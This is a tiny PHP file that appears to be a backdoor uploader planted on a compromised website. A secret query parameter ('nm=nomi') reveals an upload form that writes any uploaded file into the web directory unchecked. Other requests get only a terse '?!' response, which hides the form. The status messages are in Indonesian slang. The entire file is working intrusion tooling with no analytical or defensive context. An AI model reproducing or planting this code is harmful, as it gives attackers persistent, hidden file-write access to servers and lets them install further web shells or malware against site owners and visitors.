<?php
if (isset($_GET["nm"])) {
    if ($_GET["nm"] == "nomi") {
        echo 'NowMeee <form action="" method="post" enctype="multipart/form-data" name="u" id="u">';
        echo '<input type="file" name="file" size="50"><input name="u_u" type="submit" id="u_u" value="Upload"></form>';
        if (isset($_POST['u_u']) && $_POST['u_u'] == "Upload") {
            if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
                echo '<b>done cok</b><br><br>';
            } else {
                echo '<b>GK BISA AJG</b><br><br>';
            }
        }
    } else {
        echo "?!";
    }
}
?>
